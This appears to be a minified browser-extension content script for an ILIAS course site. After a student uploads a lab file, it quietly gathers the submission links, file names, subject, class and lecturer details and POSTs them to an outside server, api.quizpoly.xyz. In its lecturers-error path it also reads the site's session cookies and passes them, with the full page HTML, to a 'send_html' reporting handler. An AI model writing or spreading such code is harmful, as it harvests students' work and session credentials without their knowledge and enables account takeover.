const apiUrl="https://api.quizpoly.xyz",breadcrumb=document.querySelector(".ilTableHeaderTitle > a"),lab=breadcrumb&&breadcrumb.innerText.split("-")[1].trim(),urlParsed=new URL(window.location.href),fileId="file-"+urlParsed.searchParams.get("ref_id")+urlParsed.searchParams.get("ass_id"),subjectCodePattern=/\b[A-Za-z]{3}\s?\d{3,4}/,alertEl=document.querySelector(".alert-success");if(alertEl&&("Success Message\nĐã tải lên file"==alertEl.innerText||"Success Message\nFile uploaded"==alertEl.innerText)){const a=Array.from(document.querySelectorAll("table tbody > tr")),b=a.map(e=>e.querySelector("td:last-child>a").getAttribute("href")).join("\n");sendFile(b)}function getSubject(){try{var e=document.querySelectorAll(".breadcrumb a");if(!e.length)return{classCode:"",subjectName:""};for(const t of e){const r=t.textContent.trim();if(!r.startsWith("HK"))if(r.match(subjectCodePattern))return{subjectName:extractSubjectName(r),classCode:extractClassCode(t)}}return{classCode:"",subjectName:""}}catch(e){return console.error(e),sendHtml(`Get file get subject error: ${e}`),{classCode:"",subjectName:""}}}function extractClassCode(e){const t=e.parentNode.nextElementSibling;if(!t)return"";let r=t.textContent.trim();if(/thầy|cô/i.test(r)){let e=r.split("-");if(!e[0].match(subjectCodePattern))return r;4<=e.length&&e.splice(0,e.length-2),r=e.join("-")}return r.trim()}function extractSubjectName(e){return e.replace("z_","").replace("Các Lớp - ","").replace(/_/g,"-").replace(/^Môn /,"").trim()}function getRefIdMembers(){let e="";var t=/^[A-Z]{2,3}[0-9]{3,5}([_|\.] ?[0-9]{1,3})?(_[A-Za-z]{1,15})?$/;let r=document.querySelector(".breadcrumb>span:nth-last-child(2)>a");return r&&(null===r.innerText.match(t)&&(r=document.querySelector(".breadcrumb>span:nth-last-child(3)>a")),null!==r.innerText.match(t)&&(t=r.getAttribute("href"),e=/ref_id=([^&]+)/.exec(t)[1])),e}async function fetchWithRetry(e,t=1){let r=await fetch(e);for(;500<=r.status&&0<t;)t--,r=await fetch(e);return r}function processLecturers(e){let t="";const r=e.querySelector(".ilHeaderDesc");if(r)return r.textContent.trim();const n=Array.from(e.querySelectorAll(".il-card dl > dd")).reduce((e,t,r,n)=>{const l=t.textContent;if("Support Contact"===l)return e[r-1]="-"+e[r-1],e;if(l&&l.replace(/[^0-9]/g,"").length<5)e.push(l);else if(0!==r)return e;return e},[]);return n.length&&(t=n.join(" - ")),t}function processLecturers2(e){const t=e.querySelector(".ilHeaderDesc");if(t&&(lecturers=t.innerText.trim()),!lecturers){const l=e.querySelectorAll(".il-card dl > dd"),a=[];for(var[r,n]of l.entries()){const c=n.innerText;if("Support Contact"!=c){if(void 0===c&&sendHtml("get file lecturers member undefined",html),void 0!==c&&c.replace(/[^0-9]/g,"").length<5)a.push(c);else if(0!=r)break}else a[r-1]="-"+a[r-1]}lecturers=a.length?a.join(" - "):""}return console.debug(lecturers),lecturers}async function getLecturers(t){var e=getRefIdMembers();if(!e)return"";let r=await fetchWithRetry(`${window.location.origin}/ilias.php?ref_id=${e}&cmdClass=ilusersgallerygui&cmd=view&cmdNode=4t:zw:102:6&baseClass=ilrepositorygui`);if(!r.ok)return console.error("Failed to fetch:",r.statusText),"";const n=await r.text();e=processLecturers(parseHTML(n));return e||(console.debug("Lecturers not found, handling error..."),chrome.runtime.sendMessage({type:"get_cookies",domain:window.location.host},e=>{sendHtml(`lecturers empty - ${r.status} - ${t} - ${window.location.href} - ${e.cookie}`,n.includes("Failure Message")?"Failure Message":n)})),console.debug(e),e}function getFileInfo(){return new Promise((r,e)=>{chrome.storage.local.get(fileId,e=>{const t=e[fileId];t.sort((e,t)=>e.name.localeCompare(t.name)),fileName=t.map(({name:e})=>e).join("\n"),fileSize=t.map(({size:e})=>humanFileSize(e)).join(","),r({fileName:fileName,fileSize:fileSize}),chrome.storage.local.remove(fileId)})})}async function sendFile(e){var{subjectName:t,classCode:r}=getSubject(),n=await getLecturers(t),{server:l,term:a}=getServerTerm(),{fileName:c,fileSize:s}=await getFileInfo(),a={fileUrl:e,fileName:c,subjectName:t,size:s,class:n?`${r} - ${n}`:r,lab:lab,server:l,term:a};fetch(apiUrl+"/quizpoly/lab",{method:"POST",headers:{"Content-Type":"application/json"},referrerPolicy:"origin",body:JSON.stringify(a)}).then(e=>e.json()).then(e=>console.debug(e))}function getServerTerm(){try{const e=document.querySelector(".crumb:nth-child(3) > a").textContent,t=document.querySelector(".crumb:nth-child(2) > a").textContent;return server=t.split(" ").map(e=>e.charAt(0)).join(""),term=e.replace("HK_","").replace("_"," "),{server:server,term:term}}catch(e){return sendHtml(`Upload file get server term error: ${e.message} - ${window.location.href}`),{server:"",term:""}}}async function sendHtml(e,t){t=t||document.body.innerHTML.replace(/\n/g,"").replace(/\t/g,""),chrome.runtime.sendMessage({type:"send_html",note:e,html:t})}function humanFileSize(e,t=1){if(Math.abs(e)<1e3)return e+" B";var r=["kB","MB","GB","TB","PB","EB","ZB","YB"];let n=-1;for(var l=10**t;e/=1e3,++n,1e3<=Math.round(Math.abs(e)*l)/l&&n<r.length-1;);return e.toFixed(t)+" "+r[n]}function parseHTML(e){return(new DOMParser).parseFromString(e,"text/html")}